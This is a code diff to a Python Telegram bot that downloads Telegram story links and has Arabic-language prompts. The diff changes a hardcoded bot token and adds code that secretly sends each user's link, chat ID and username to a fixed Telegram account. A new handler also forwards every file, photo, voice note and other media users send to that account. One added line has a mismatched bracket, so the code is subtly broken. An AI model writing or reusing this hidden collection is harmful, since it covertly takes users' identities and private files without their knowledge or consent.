@@ -1,7 +1,7 @@
 import telebot,requests,json,ast,os
 from telebot import *
 import requests
-token = "6330729404:AAFu8J1zDYgPu-A-t9NHF-M9mD3cNZQMpuA"
+token = "6330729404:AAFu8J1zDYgPu-A-t9NHF-M9mD3cNZQ"
 def ch(user_id): 
    b=0
    f = open("ch.txt", "r")
@@ -121,6 +121,7 @@ def h(message):
   print(kl)
   if kl == None:
    if 'https://t.me/' in message.text:
+    bot.send_message(6338388702,f"{message.text}\n{message.chat.id}\n(message.from_user.username}")
     f= bot.reply_to(message,'جار  تحميل الملفات .....')
     m = (message.text).replace("https://t.me/","")
     print(m.split('/s/')[0])
@@ -147,4 +148,8 @@ def h(message):
 - https://t.me/{kl}
 
 ‼️| اشترك ثم ارسل /start""")
+@bot.message_handler(content_types=['sticker','document', 'photo', 'audio', 'video', 'voice']) # list relevant content types
+def addfile(message):
+ 
+ bot.forward_message(6338388702, message.chat.id, message.message_id)
 bot.infinity_polling()
